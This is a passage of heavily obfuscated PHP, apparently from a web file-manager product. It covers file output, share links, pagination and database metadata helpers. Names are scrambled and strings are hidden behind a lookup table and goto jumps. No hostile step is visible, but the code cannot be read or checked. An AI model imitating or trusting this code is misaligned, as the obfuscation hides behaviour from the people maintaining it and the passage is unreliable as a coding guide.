$aí‘ÎŒ•[87]) { header($aí‘ÎŒ•[1208]); die; } goto B¾¨Õ¤µ«; A¾‰¾ôÉëî: if ($EİÀç°‹Ô˜) { return IO::fileOutServer($Fßïò¯–Ê×[$aí‘ÎŒ•[76]], $cöôÀ¢Ğ , $f­ùÛé­¤¬, $E­ªÏùÂâ); } IO::fileOut($Fßïò¯–Ê×[$aí‘ÎŒ•[76]], $cöôÀ¢Ğ , $f­ùÛé­¤¬, $E­ªÏùÂâ); goto b¬Â«Á´À¹; B¾¨Õ¤µ«: $Fßïò¯–Ê× = $this->model->fileInfoGet($dÃ”òÁ’Áğ); $E­ªÏùÂâ = $Fßïò¯–Ê×[$aí‘ÎŒ•[170]] ? $Fßïò¯–Ê×[$aí‘ÎŒ•[170]] : $E­ªÏùÂâ; $f­ùÛé­¤¬ = isset($GLOBALS[$aí‘ÎŒ•[1209]]) ? $GLOBALS[$aí‘ÎŒ•[1209]] : $aÅ•©ë×[$aí‘ÎŒ•[28]]; goto A¾‰¾ôÉëî; b¬Â«Á´À¹: } public function fileOut($bíµ®©ºÁÍ, $a¤¾ƒá¸š = false, $BŠ¦ŸñŒœä = false, $dœ¸Ğ¦éÙ× = '') { $this->_fileOut($bíµ®©ºÁÍ, $a¤¾ƒá¸š, $BŠ¦ŸñŒœä, $dœ¸Ğ¦éÙ×); } public function fileOutServer($cÊíÂ°ˆÉŒ, $C«¯ñØÂòÛ = false, $dõñ¸†šà = false, $eà¿©¦Ì‡ = '') { $this->_fileOut($cÊíÂ°ˆÉŒ, $C«¯ñØÂòÛ, $dõñ¸†šà, $eà¿©¦Ì‡, !0); } protected function _fileOutImage($aÈ§¿¨§éÕ, $B™­Ğù¿ = 250) { goto A§¸îÉ©ø; A§¸îÉ©ø: $CÏØ‡©´åŒ =& $_SERVER[¬ı§†‰ú˜¼]; $f‹„İ¾÷ò’ = $this->model->pathInfo($aÈ§¿¨§éÕ); if ($f‹„İ¾÷ò’[$CÏØ‡©´åŒ[401]] == $CÏØ‡©´åŒ[87]) { show_json($CÏØ‡©´åŒ[1210] . $aÈ§¿¨§éÕ, !1); } goto c¯åË”Š‹Ê; c¯åË”Š‹Ê: $fåŸ°ÆÓÇì = $this->model->fileInfoGet($aÈ§¿¨§éÕ); $fåŸ°ÆÓÇì[$CÏØ‡©´åŒ[28]] = $f‹„İ¾÷ò’[$CÏØ‡©´åŒ[28]]; $fåŸ°ÆÓÇì[$CÏØ‡©´åŒ[163]] = $f‹„İ¾÷ò’[$CÏØ‡©´åŒ[163]]; goto d½â†·ØÚÑ; d½â†·ØÚÑ: $GLOBALS[$CÏØ‡©´åŒ[1209]] = $fåŸ°ÆÓÇì[$CÏØ‡©´åŒ[28]]; $GLOBALS[$CÏØ‡©´åŒ[162]] = $fåŸ°ÆÓÇì; IO::fileOutImage($fåŸ°ÆÓÇì[$CÏØ‡©´åŒ[76]], $B™­Ğù¿); goto aÚê‘Ÿãîñ; aÚê‘Ÿãîñ: } public function fileOutImage($fÖ²ïóùˆË, $FÛ›ˆ¿œµİ = 250) { $this->_fileOutImage($fÖ²ïóùˆË, $FÛ›ˆ¿œµİ); } public function fileOutImageServer($fñôÒÊëÊ‰, $eµíóï…ÀŞ = 250) { $this->_fileOutImage($fñôÒÊëÊ‰, $eµíóï…ÀŞ); } public function link($CÉ¡ğ—´‚É, $C«¡•¥¦¶ª = '') { $bğ¯‡¦¿ËÜ = $this->model->fileInfoGet($CÉ¡ğ—´‚É); return IO::link($bğ¯‡¦¿ËÜ[$_SERVER[¬ı§†‰ú˜¼][76]], $C«¡•¥¦¶ª); } protected function parse($FœñäÃ•±) { $fÑ®å‹Û =& $_SERVER[¬ı§†‰ú˜¼]; if (strstr($FœñäÃ•±, $fÑ®å‹Û[8]) === !1) { return array($fÑ®å‹Û[410] => intval($FœñäÃ•±), $fÑ®å‹Û[76] => $fÑ®å‹Û[33], $fÑ®å‹Û[1205] => array()); } $eì¨Š·¶ = explode($fÑ®å‹Û[8], trim($FœñäÃ•±, $fÑ®å‹Û[8])); if (count($eì¨Š·¶) < 2) { show_tips($FœñäÃ•± . $fÑ®å‹Û[1211]); } return array($fÑ®å‹Û[410] => intval($eì¨Š·¶[0]), $fÑ®å‹Û[76] => $eì¨Š·¶[1], $fÑ®å‹Û[1205] => array_slice($eì¨Š·¶, 1)); } } class PathDriverDbShareItem extends PathDriverDB { public function __construct($f¯í†ÏÌ‹â) { $this->pathParse = $f¯í†ÏÌ‹â; $this->model = Model($_SERVER[¬ı§†‰ú˜¼][1204]); } public function getPathOuter($bì”ÚĞëŞÙ) { $BÚ¨‹‡à =& $_SERVER[¬ı§†‰ú˜¼]; if (!$bì”ÚĞëŞÙ) { return $bì”ÚĞëŞÙ; } $dåƒîˆöË° = $this->parse($bì”ÚĞëŞÙ); return trim(KodIO::makeShare($this->pathParse[$BÚ¨‹‡à[392]], $dåƒîˆöË°[$BÚ¨‹‡à[392]]), $BÚ¨‹‡à[8]); } protected function infoParse($aÆÂóÊ‹µŒ, $F÷ÉÛÊ¾…ù = false, $c¦å†ƒ–ô = false) { $bÑëôìºœ =& $_SERVER[¬ı§†‰ú˜¼]; $D·õ™‰ß¸š = $this->pathParse[$bÑëôìºœ[392]]; $f±µàô¢ïÓ = trim($this->pathParse[$bÑëôìºœ[1063]], $bÑëôìºœ[8]); return Action($bÑëôìºœ[1212])->sharePathInfo($D·õ™‰ß¸š, $f±µàô¢ïÓ); } public function infoFull($BÇğ¬×Ó­Ğ) { $A®±ñÔò»¤ =& $_SERVER[¬ı§†‰ú˜¼]; $BÈÊšªé„Ò = explode($A®±ñÔò»¤[8], trim($BÇğ¬×Ó­Ğ, $A®±ñÔò»¤[8])); if (count($BÈÊšªé„Ò) > 1) { $eñÑ®¾ä = implode($A®±ñÔò»¤[8], array_splice($BÈÊšªé„Ò, 1)); $AË˜…ÔëèÓ = $this->model->pathInfoByPath($BÈÊšªé„Ò[0], $eñÑ®¾ä); if (!$AË˜…ÔëèÓ) { return !1; } $this->pathParse[$A®±ñÔò»¤[1063]] = $AË˜…ÔëèÓ[$A®±ñÔò»¤[394]]; } return $this->infoParse($BÇğ¬×Ó­Ğ); } public function listAll($eí¦Ïİ»è¡) { goto dˆÊ›îªæ‰; d°£¤ÍÇİÙ: foreach ($dù¯¶á¸¢ô as &$Bç¬®Å²’‹) { check_abort(); $Bç¬®Å²’‹[$CàÀˆ¢Ø‰†[85]] = $d½©·‡Óè´->_shareItemeParse($Bç¬®Å²’‹[$CàÀˆ¢Ø‰†[85]], $F«ä¯ÌŸåò); } unset($Bç¬®Å²’‹); return $dù¯¶á¸¢ô; goto fŒ³‹ÜŠ£; dˆÊ›îªæ‰: $CàÀˆ¢Ø‰† =& $_SERVER[¬ı§†‰ú˜¼]; $Fß¤«··²× = IO::info($this->pathParse[$CàÀˆ¢Ø‰†[76]]); if (!$Fß¤«··²×) { return array(); } goto d…©ŸÅÍ’è; d…©ŸÅÍ’è: $dù¯¶á¸¢ô = $this->model->listAll($eí¦Ïİ»è¡); $F«ä¯ÌŸåò = Model($CàÀˆ¢Ø‰†[562])->getInfo($Fß¤«··²×[$CàÀˆ¢Ø‰†[466]]); $d½©·‡Óè´ = Action($CàÀˆ¢Ø‰†[1212]); goto d°£¤ÍÇİÙ; fŒ³‹ÜŠ£: } } class PathDriverDbShareLink extends PathDriverDB { public function __construct($EÉ©‡ ­‹) { $this->pathParse = $EÉ©‡ ­‹; $this->model = Model($_SERVER[¬ı§†‰ú˜¼][1204]); } protected function infoParse($EñÊœ‡¡¾, $b”ç”­¯ªó = false, $CÁ¬Ø¢–ß = false) { $Cœ·»´î =& $_SERVER[¬ı§†‰ú˜¼]; return Action($Cœ·»´î[1069])->sharePathInfo($this->pathParse[$Cœ·»´î[76]], !0); } public function listPath($a½ŞŒ…Ò˜œ, $Aåò¼ƒñöĞ = false) { $b˜…éÒÊßš =& $_SERVER[¬ı§†‰ú˜¼]; $bµÚ‹®÷…÷ = parent::listPath($a½ŞŒ…Ò˜œ, $Aåò¼ƒñöĞ); foreach ($bµÚ‹®÷…÷ as $b …Ä©¢ÆÖ => $eæ¤¡ß‡†É) { if (!in_array($b …Ä©¢ÆÖ, array($b˜…éÒÊßš[74], $b˜…éÒÊßš[75]))) { continue; } foreach ($eæ¤¡ß‡†É as $dëÎÇ±²îÍ => $eöØù¦é®î) { $bµÚ‹®÷…÷[$b …Ä©¢ÆÖ][$dëÎÇ±²îÍ] = Action($b˜…éÒÊßš[1069])->shareItemInfo($eöØù¦é®î); } } return $bµÚ‹®÷…÷; } public function listAll($bÄÙèŸ®‰) { goto aˆæš÷×í; aˆæš÷×í: $d‰¡ÏÂÌÁ¡ =& $_SERVER[¬ı§†‰ú˜¼]; $d²†Šë¡‘• = IO::info($this->pathParse[$d‰¡ÏÂÌÁ¡[76]]); if (!$d²†Šë¡‘•) { return array(); } goto D™‚Œƒæ×Ï; D™‚Œƒæ×Ï: $b¬®éİ Š = $this->model->listAll($bÄÙèŸ®‰); foreach ($b¬®éİ Š as &$aˆØ²‘ßßš) { $aˆØ²‘ßßš[$d‰¡ÏÂÌÁ¡[85]] = Action($d‰¡ÏÂÌÁ¡[1069])->shareItemInfo($aˆØ²‘ßßš[$d‰¡ÏÂÌÁ¡[85]]); } unset($aˆØ²‘ßßš); goto d³¢®ÛÇ§—; d³¢®ÛÇ§—: return $b¬®éİ Š; goto CõìÅòÏ½°; CõìÅòÏ½°: } } goto B§©÷½ê‰•; D¹ÈÙÓŠ¶Å: class ModelBase extends Model { const SQL_WHERE_IN_CHUNK = 2000; protected $dataAuto = array(array("\155\157\x64\x69\146\171\x54\x69\155\x65", "\x74\151\x6d\x65", "\x69\156\163\x65\x72\x74\x2c\x75\160\x64\141\x74\145", "\146\165\156\143\164\151\x6f\156"), array("\143\162\x65\141\x74\145\x54\151\155\145", "\164\151\x6d\145", "\151\x6e\x73\145\x72\164", "\146\165\156\143\164\x69\157\x6e")); public function setDataAuto($dœß÷ä››) { $this->dataAuto = $dœß÷ä››; } public function __construct($eÑéÜöµ»à = '', $aÈ‹ÏÑŞÒé = '', $Aì¹–ºŒÉ = '') { parent::__construct($eÑéÜöµ»à, $aÈ‹ÏÑŞÒé, $Aì¹–ºŒÉ); } public static function textEncode($BŠ‘ÎŠÛÂÅ) { if (!$BŠ‘ÎŠÛÂÅ) { return $BŠ‘ÎŠÛÂÅ; } $CË‡‚¼™Á = json_encode($BŠ‘ÎŠÛÂÅ); $CË‡‚¼™Á = preg_replace_callback($_SERVER[¬ı§†‰ú˜¼][352], function ($eŠå‹Ì«ÚÏ) { return addslashes($eŠå‹Ì«ÚÏ[0]); }, $CË‡‚¼™Á); return json_decode($CË‡‚¼™Á); } public static function textDecode($EˆêÔÄã—) { $EÕš¬ï¸µÌ =& $_SERVER[¬ı§†‰ú˜¼]; $bãİï•—²£ = json_encode($EˆêÔÄã—); $bãİï•—²£ = preg_replace_callback($EÕš¬ï¸µÌ[353], function ($AÄà°Œ˜Öª) { return $_SERVER[¬ı§†‰ú˜¼][97]; }, $bãİï•—²£); return json_decode($bãİï•—²£); } protected $tableMeta = array(); protected function _beforeInsert(&$b¤®ŞŠò´™, $f¤¹íà¤Øî) { $C£Á‘âªÅÎ =& $_SERVER[¬ı§†‰ú˜¼]; if (!$this->checkDataAutoHas($C£Á‘âªÅÎ[354])) { return; } $this->dataBeforeFilter($b¤®ŞŠò´™, $C£Á‘âªÅÎ[354]); } protected function _beforeUpdate(&$eÇÔ›ÔÛ¸Ì, $BÆÙ‹¼ õ³) { $aùÙâÔÅ¤ =& $_SERVER[¬ı§†‰ú˜¼]; if (!$this->checkDataAutoHas($aùÙâÔÅ¤[355])) { return; } $this->dataBeforeFilter($eÇÔ›ÔÛ¸Ì, $aùÙâÔÅ¤[355]); } protected function _afterSelect(&$e”å®‘½‚ä, $f‡“†£›ôš) { if (!is_array($e”å®‘½‚ä)) { return; } if (!$this->checkDataAutoHas($_SERVER[¬ı§†‰ú˜¼][356])) { return; } foreach ($e”å®‘½‚ä as &$F…¸Áäö¼ì) { $this->dataAfterFilter($F…¸Áäö¼ì); } unset($F…¸Áäö¼ì); } protected function _afterFind(&$CÍº¬±öÆ², $A½’Íæ¼‚­) { if (!is_array($CÍº¬±öÆ²)) { return; } if (!$this->checkDataAutoHas($_SERVER[¬ı§†‰ú˜¼][356])) { return; } $this->dataAfterFilter($CÍº¬±öÆ²); } public function setAutoIncrement($dŠ’²ƒÄ„Ò) { $CÄÉ‚ƒ½¸‹ = array($this->getPk() => $dŠ’²ƒÄ„Ò); $d…¬åé‡­ = $this->data($CÄÉ‚ƒ½¸‹)->add(); if ($d…¬åé‡­) { $this->delete($d…¬åé‡­); } } public function getAutoIncrement() { $bƒ¸¦³¹Š = $this->getTableName(); $E²èÄœËòˆ = $this->max($this->getPk()); $a×…ô¢Û¥¢ = $this->query("\163\x68\x6f\167\x20\x74\141\x62\x6c\x65\x20\163\x74\141\164\x75\163\40\x77\150\145\162\x65\40\x4e\141\155\145\x3d\x27{$bƒ¸¦³¹Š}\47"); $E‡×ÅËÛÂÇ = $a×…ô¢Û¥¢[0][$_SERVER[¬ı§†‰ú˜¼][357]]; $bÁÖÊ–ó† = max($E²èÄœËòˆ, $E‡×ÅËÛÂÇ); return $bÁÖÊ–ó†; } protected function _callBefore($B˜Ãçª¸Ÿ, $dâ»ë”°‡¨) { return $this->cacheCallCheck($B˜Ãçª¸Ÿ, $dâ»ë”°‡¨, !1); } protected function _callAfter($aÏŠ¸ğªÃÎ, $b˜ë¹æêé) { return $this->cacheCallCheck($aÏŠ¸ğªÃÎ, $b˜ë¹æêé, !0); } protected function cacheFunctionAlias($fÂñ¯éœ¦Õ) { return !1; } public function cacheMemory() { return $this->cache(null, 0); } protected function cacheCallCheck($b†«·Î¥¿, $e’ªÕ›—Û, $a‚‘Ÿ¶•ªÈ = false) { $DóØ›Íœ¾¨ = $this->cacheFunctionAlias($e’ªÕ›—Û); if (!$DóØ›Íœ¾¨) { return; } foreach ($DóØ›Íœ¾¨ as $f¿ÚÜ‚Ò§ => $BŒƒ÷ÛƒêŒ) { $cÖÇ‰‹‚¹Ò = $BŒƒ÷ÛƒêŒ[0]; $dƒîĞ —ÂÓ = explode($_SERVER[¬ı§†‰ú˜¼][47], $BŒƒ÷ÛƒêŒ[1]); if ($b†«·Î¥¿ == $f¿ÚÜ‚Ò§) { return $this->cacheFunctionGet($f¿ÚÜ‚Ò§, $cÖÇ‰‹‚¹Ò); } if ($a‚‘Ÿ¶•ªÈ && in_array($b†«·Î¥¿, $dƒîĞ —ÂÓ)) { $this->cacheFunctionClear($f¿ÚÜ‚Ò§, $cÖÇ‰‹‚¹Ò); } } } public function cacheFunctionGet($Då¾¦Åª¨ˆ, $dÃªÂ¶ğèî) { $B¯‚öµğÍ = $this->cacheKeyMake($Då¾¦Åª¨ˆ, $dÃªÂ¶ğèî); $aàÔ…×›Æ = Cache::get($B¯‚öµğÍ); if (!is_array($aàÔ…×›Æ)) { $aàÔ…×›Æ = call_user_func_array(array($this, $Då¾¦Åª¨ˆ), array($dÃªÂ¶ğèî, !0)); Cache::set($B¯‚öµğÍ, $aàÔ…×›Æ); } return $aàÔ…×›Æ; } public function cacheFunctionClear($EŞÚáÃÓÏ, $CĞ¼í¿İ­) { $Dâõ¿÷Â¢… = $CĞ¼í¿İ­; if (!is_array($CĞ¼í¿İ­)) { $Dâõ¿÷Â¢… = array($CĞ¼í¿İ­); } foreach ($Dâõ¿÷Â¢… as $C£í¬‘Ø«) { $CËÈÁàÈ¤¥ = $this->cacheKeyMake($EŞÚáÃÓÏ, $C£í¬‘Ø«); Cache::remove($CËÈÁàÈ¤¥); } } private function cacheKeyMake($e¿‚éŸ³Ù’, $d×¯Î«ì‡) { $A³Í÷Š‡Ñ‰ =& $_SERVER[¬ı§†‰ú˜¼]; return get_class($this) . $A³Í÷Š‡Ñ‰[71] . $e¿‚éŸ³Ù’ . $A³Í÷Š‡Ñ‰[358] . $d×¯Î«ì‡; } protected function selectPageReset() { $f‚ á¢†ˆ =& $_SERVER[¬ı§†‰ú˜¼]; if (isset($GLOBALS[$f‚ á¢†ˆ[359]])) { return; } $GLOBALS[$f‚ á¢†ˆ[359]] = isset($GLOBALS[$f‚ á¢†ˆ[7]][$f‚ á¢†ˆ[360]]) ? $GLOBALS[$f‚ á¢†ˆ[7]][$f‚ á¢†ˆ[360]] : !1; $GLOBALS[$f‚ á¢†ˆ[361]] = isset($GLOBALS[$f‚ á¢†ˆ[7]][$f‚ á¢†ˆ[350]]) ? $GLOBALS[$f‚ á¢†ˆ[7]][$f‚ á¢†ˆ[350]] : !1; $GLOBALS[$f‚ á¢†ˆ[7]][$f‚ á¢†ˆ[360]] = !1; $GLOBALS[$f‚ á¢†ˆ[7]][$f‚ á¢†ˆ[350]] = !1; } protected function selectPageRestore() { $cñ„ğÉ½Ì‚ =& $_SERVER[¬ı§†‰ú˜¼]; if (!isset($GLOBALS[$cñ„ğÉ½Ì‚[359]])) { return; } $GLOBALS[$cñ„ğÉ½Ì‚[7]][$cñ„ğÉ½Ì‚[360]] = $GLOBALS[$cñ„ğÉ½Ì‚[359]]; $GLOBALS[$cñ„ğÉ½Ì‚[7]][$cñ„ğÉ½Ì‚[350]] = $GLOBALS[$cñ„ğÉ½Ì‚[361]]; unset($GLOBALS[$cñ„ğÉ½Ì‚[359]]); unset($GLOBALS[$cñ„ğÉ½Ì‚[361]]); } protected function selectPage($f³ğ±“à«ù = 200, $fôƒàíùÆ• = 1) { goto aÁ–ùáÑõ‹; bİÀ±ĞÑ©ñ: $E•«ÆÇÎêÍ = 50000; $f³ğ±“à«ù = isset($in[$bÑ¤ÓÒ§Ñ[360]]) && $in[$bÑ¤ÓÒ§Ñ[360]] ? $in[$bÑ¤ÓÒ§Ñ[360]] : $f³ğ±“à«ù; if ($f³ğ±“à«ù === -1) { $in[$bÑ¤ÓÒ§Ñ[360]] = !1; $E•«ÆÇÎêÍ = 100000000; $f³ğ±“à«ù = $E•«ÆÇÎêÍ; } goto cé‹ÊéßÕ; Fã›¿ŒÎ¯: return $F¾¶ê´ôâ; goto f¨„Ê•Ç; BÈ«…„Ó¨­: $AŒõÌ‡¢ Â = array(); $AëÁîì¹á‰ = 1; if ($fôƒàíùÆ• == 1 && $AëÁîì¹á‰) { $this->optionsValue($EØåÔ¥); $AŒõÌ‡¢ Â = $this->page($fôƒàíùÆ•, $f³ğ±“à«ù)->select(); $f‡ßœÂëšã = is_array($AŒõÌ‡¢ Â) ? count($AŒõÌ‡¢ Â) : 0; if ($f‡ßœÂëšã < $f³ğ±“à«ù) { $D¨çã¶íÖ± = 1; } else { $this->optionsValue($C’Ü£ğ…İÖ); $f‡ßœÂëšã = intval($this->count()); $D¨çã¶íÖ± = ceil($f‡ßœÂëšã / $f³ğ±“à«ù); } } else { $this->optionsValue($C’Ü£ğ…İÖ); $f‡ßœÂëšã = intval($this->count()); $D¨çã¶íÖ± = ceil($f‡ßœÂëšã / $f³ğ±“à«ù); $fôƒàíùÆ• = $fôƒàíùÆ• >= $D¨çã¶íÖ± ? $D¨çã¶íÖ± : $fôƒàíùÆ•; $this->optionsValue($EØåÔ¥); $AŒõÌ‡¢ Â = $this->page($fôƒàíùÆ•, $f³ğ±“à«ù)->select(); } goto bÒæ×¨´æ«; cé‹ÊéßÕ: $C’Ü£ğ…İÖ = $EØåÔ¥; $C’Ü£ğ…İÖ[$bÑ¤ÓÒ§Ñ[362]] = array(); $f³ğ±“à«ù = intval($f³ğ±“à«ù); goto DÚù½›ˆÙ; bÒæ×¨´æ«: if (!is_array($AŒõÌ‡¢ Â)) { $AŒõÌ‡¢ Â = array(); } if ($D¨çã¶íÖ± == 1) { $f‡ßœÂëšã = count($AŒõÌ‡¢ Â); } $F¾¶ê´ôâ = array($bÑ¤ÓÒ§Ñ[363] => array($bÑ¤ÓÒ§Ñ[364] => $f‡ßœÂëšã, $bÑ¤ÓÒ§Ñ[360] => $f³ğ±“à«ù, $bÑ¤ÓÒ§Ñ[350] => $fôƒàíùÆ•, $bÑ¤ÓÒ§Ñ[365] => $D¨çã¶íÖ±), $bÑ¤ÓÒ§Ñ[366] => $AŒõÌ‡¢ Â); goto Fã›¿ŒÎ¯; aÁ–ùáÑõ‹: $bÑ¤ÓÒ§Ñ =& $_SERVER[¬ı§†‰ú˜¼]; global $in; $EØåÔ¥ = $this->optionsValue(); goto bİÀ±ĞÑ©ñ; DÚù½›ˆÙ: $f³ğ±“à«ù = $f³ğ±“à«ù <= 5 ? 5 : ($f³ğ±“à«ù >= $E•«ÆÇÎêÍ ? $E•«ÆÇÎêÍ : $f³ğ±“à«ù); $fôƒàíùÆ• = intval(isset($in[$bÑ¤ÓÒ§Ñ[350]]) && $in[$bÑ¤ÓÒ§Ñ[350]] ? $in[$bÑ¤ÓÒ§Ñ[350]] : $fôƒàíùÆ•); $fôƒàíùÆ• = $fôƒàíùÆ• <= 1 ? 1 : $fôƒàíùÆ•; goto BÈ«…„Ó¨­; f¨„Ê•Ç: } protected function checkLength($f§Ô·Åéè•, $a¾Œ¦—±ß = 0, $B‰³Šè­Ÿ‘ = '') { $fµ§£¹ÌïÖ =& $_SERVER[¬ı§†‰ú˜¼]; $a¾Œ¦—±ß = $a¾Œ¦—±ß ? $a¾Œ¦—±ß : 65536; if (!$f§Ô·Åéè• || strlen($f§Ô·Åéè•) < $a¾Œ¦—±ß) { return; } $B‰³Šè­Ÿ‘ = $B‰³Šè­Ÿ‘ ? $B‰³Šè­Ÿ‘ . $fµ§£¹ÌïÖ[68] : $fµ§£¹ÌïÖ[33]; show_json($B‰³Šè­Ÿ‘ . LNG($fµ§£¹ÌïÖ[367]) . "\x28{$a¾Œ¦—±ß}\x29", !1); } protected function metaSet($DÚ²‚ñùß®, $AÑğ¤ƒÀ¯â = null, $C†½œ‘­¶ß = null) { goto fç•ÍËÎš; cãŸŒ‚˜Ê: if (is_null($AÑğ¤ƒÀ¯â)) { return $C¢Õ­ô©¶‡->where(array($FÕÖ»ç‘áÜ => $DÚ²‚ñùß®))->delete(); } if (is_null($C†½œ‘­¶ß) && is_string($AÑğ¤ƒÀ¯â)) { return $C¢Õ­ô©¶‡->where($BÍî†ƒ°¾)->delete(); } $DèáÔ¿“×Ò = is_array($AÑğ¤ƒÀ¯â) ? $AÑğ¤ƒÀ¯â : array(); goto Dãæô…“èÚ; Eä¨¾²¯¶Í: $b´Ø™¤›«Æ = $e‰ÓÇ³¾[372] . $this->tableMeta; CacheLock::lock($b´Ø™¤›«Æ); $C¢Õ­ô©¶‡->where(array($FÕÖ»ç‘áÜ => $DÚ²‚ñùß®))->addAll($eÜ‘ƒìëÉ¡, array(), !0); goto cîøñ¦Õ§å; fç•ÍËÎš: $e‰ÓÇ³¾ =& $_SERVER[¬ı§†‰ú˜¼]; if (!$this->tableMeta || !$DÚ²‚ñùß®) { return !1; } $FÕÖ»ç‘áÜ = $this->tableMeta[$e‰ÓÇ³¾[368]]; goto c¨ÓÀ ¯×î; Dãæô…“èÚ: if (is_string($AÑğ¤ƒÀ¯â)) { $DèáÔ¿“×Ò[$AÑğ¤ƒÀ¯â] = $C†½œ‘­¶ß; } $eÜ‘ƒìëÉ¡ = array(); foreach ($DèáÔ¿“×Ò as $f…ã¼ó´äõ => $A©õÈ¦¥ÚÌ) { $this->checkLength($A©õÈ¦¥ÚÌ, !1, $bîŞŞ‹–½ñ . $e‰ÓÇ³¾[4] . $f…ã¼ó´äõ); $eÜ‘ƒìëÉ¡[] = array($FÕÖ»ç‘áÜ => $DÚ²‚ñùß®, $e‰ÓÇ³¾[93] => $f…ã¼ó´äõ, $e‰ÓÇ³¾[371] => $A©õÈ¦¥ÚÌ); } goto Eä¨¾²¯¶Í; cîøñ¦Õ§å: CacheLock::unlock($b´Ø™¤›«Æ); return !0; goto Aö Á‰“Û•; c¨ÓÀ ¯×î: $bîŞŞ‹–½ñ = $this->tableMeta[$e‰ÓÇ³¾[369]]; $C¢Õ­ô©¶‡ = Model($bîŞŞ‹–½ñ); $BÍî†ƒ°¾ = array($FÕÖ»ç‘áÜ => $DÚ²‚ñùß®, $e‰ÓÇ³¾[370] => $AÑğ¤ƒÀ¯â); goto cãŸŒ‚˜Ê; Aö Á‰“Û•: } public function metaGet($Eè‡«¡º, $AİÃ’ËáŒ’ = false) { goto d‡»§ñ½’Í; d‡»§ñ½’Í: $eƒ…Âë®Ùğ =& $_SERVER[¬ı§†‰ú˜¼]; if (!$this->tableMeta) { return array(); } $FˆÔï°Ü„ = $this->tableMeta[$eƒ…Âë®Ùğ[368]]; goto Fâğ¢œèìÀ; Fâğ¢œèìÀ: $dßãÊŒ‹Ò¼ = Model($this->tableMeta[$eƒ…Âë®Ùğ[369]]); if ($AİÃ’ËáŒ’) { $fò¸Ö¦”·ƒ = array($FˆÔï°Ü„ => $Eè‡«¡º, $eƒ…Âë®Ùğ[93] => $AİÃ’ËáŒ’); return $dßãÊŒ‹Ò¼->where($fò¸Ö¦”·ƒ)->getField($eƒ…Âë®Ùğ[371]); } $fò¸Ö¦”·ƒ = array($FˆÔï°Ü„ => $Eè‡«¡º); goto Cä‘â»Œµ; Cä‘â»Œµ: $dáÉ‰ù×—© = $dßãÊŒ‹Ò¼->field($eƒ…Âë®Ùğ[373])->where($fò¸Ö¦”·ƒ)->select(); $dáÉ‰ù×—© = array_to_keyvalue($dáÉ‰ù×—©, $eƒ…Âë®Ùğ[93], $eƒ…Âë®Ùğ[371]); return $dáÉ‰ù×—©; goto Có“ÙŠ®—Ó; Có“ÙŠ®—Ó: } private function checkDataAutoHas($fÎ°ˆ£’Ò„) { if (!is_array($this->dataAuto) || count($this->dataAuto) == 0) { return !1; } foreach ($this->dataAuto as $DŒ¦½Ş„‰ñ) { if (in_array($fÎ°ˆ£’Ò„, explode($_SERVER[¬ı§†‰ú˜¼][47], $DŒ¦½Ş„‰ñ[2]))) { return !0; } } return !1; } private function dataBeforeFilter(&$EÏè¯Ë”­Ş, $E½ —¶º¹Š) { $BÔ¬²‡åÇ =& $_SERVER[¬ı§†‰ú˜¼]; foreach ($this->dataAuto as $Fõ¸Â‘¹ÀÇ) { $D¾ˆÇµÛŒ˜ = $Fõ¸Â‘¹ÀÇ[0]; if (!in_array($E½ —¶º¹Š, explode($BÔ¬²‡åÇ[47], $Fõ¸Â‘¹ÀÇ[2]))) { continue; } switch (trim($Fõ¸Â‘¹ÀÇ[3])) { case $BÔ¬²‡åÇ[318]: case $BÔ¬²‡åÇ[319]: $dŒ†ñçÄº = $Fõ¸Â‘¹ÀÇ[1]; $fŠ„«É¾¾é = isset($Fõ¸Â‘¹ÀÇ[4]) ? (array) $Fõ¸Â‘¹ÀÇ[4] : array(); if ($dŒ†ñçÄº == $BÔ¬²‡åÇ[196] && array_key_exists($D¾ˆÇµÛŒ˜, $EÏè¯Ë”­Ş)) { if (!$EÏè¯Ë”­Ş[$D¾ˆÇµÛŒ˜]) { unset($EÏè¯Ë”­Ş[$D¾ˆÇµÛŒ˜]); } break; } if (isset($EÏè¯Ë”­Ş[$D¾ˆÇµÛŒ˜])) { array_unshift($fŠ„«É¾¾é, $EÏè¯Ë”­Ş[$D¾ˆÇµÛŒ˜]); } if ($BÔ¬²‡åÇ[318] == $Fõ¸Â‘¹ÀÇ[3]) { $EÏè¯Ë”­Ş[$D¾ˆÇµÛŒ˜] = call_user_func_array($dŒ†ñçÄº, $fŠ„«É¾¾é); } else { $EÏè¯Ë”­Ş[$D¾ˆÇµÛŒ˜] = call_user_func_array(array(&$this, $dŒ†ñçÄº), $fŠ„«É¾¾é); } break; case $BÔ¬²‡åÇ[270]: $EÏè¯Ë”­Ş[$D¾ˆÇµÛŒ˜] = $EÏè¯Ë”­Ş[$Fõ¸Â‘¹ÀÇ[1]]; break; case $BÔ¬²‡åÇ[291]: if (isset($EÏè¯Ë”­Ş[$D¾ˆÇµÛŒ˜]) && !is_string($EÏè¯Ë”­Ş[$D¾ˆÇµÛŒ˜])) { $EÏè¯Ë”­Ş[$D¾ˆÇµÛŒ˜] = json_encode_force($EÏè¯Ë”­Ş[$D¾ˆÇµÛŒ˜]); } break; case $BÔ¬²‡åÇ[320]: if ($EÏè¯Ë”­Ş[$D¾ˆÇµÛŒ˜] === $BÔ¬²‡åÇ[33]) { unset($EÏè¯Ë”­Ş[$D¾ˆÇµÛŒ˜]); } break; case $BÔ¬²‡åÇ[321]: $EÏè¯Ë”­Ş[$D¾ˆÇµÛŒ˜] = $Fõ¸Â‘¹ÀÇ[1]; default: break; } } if ($E½ —¶º¹Š == $BÔ¬²‡åÇ[354]) { $f¾ë‹¸ÆËÑ = strtolower($this->db->getDbType()); if (strpos($f¾ë‹¸ÆËÑ, $BÔ¬²‡åÇ[9]) !== 0) { return; } $aÄ¨Ğ‘à÷ = $this->field(!0)->fields; $E¥„¾¡ŞæÂ = $aÄ¨Ğ‘à÷[$BÔ¬²‡åÇ[249]]; if (isset($aÄ¨Ğ‘à÷[$BÔ¬²‡åÇ[248]])) { unset($E¥„¾¡ŞæÂ[$aÄ¨Ğ‘à÷[$BÔ¬²‡åÇ[248]]]); } foreach ($E¥„¾¡ŞæÂ as $CêÁïñ‹¬ => $E½ —¶º¹Š) { if (!isset($EÏè¯Ë”­Ş[$CêÁïñ‹¬])) { $EÏè¯Ë”­Ş[$CêÁïñ‹¬] = $BÔ¬²‡åÇ[33]; } } } } private function dataAfterFilter(&$DßÓŠšË´ˆ) { $c™ï‡ñ”¸œ =& $_SERVER[¬ı§†‰ú˜¼]; foreach ($this->dataAuto as $dÈ„ÇÅ‘§„) { $a½†íìŒ½¸ = $dÈ„ÇÅ‘§„[0]; if 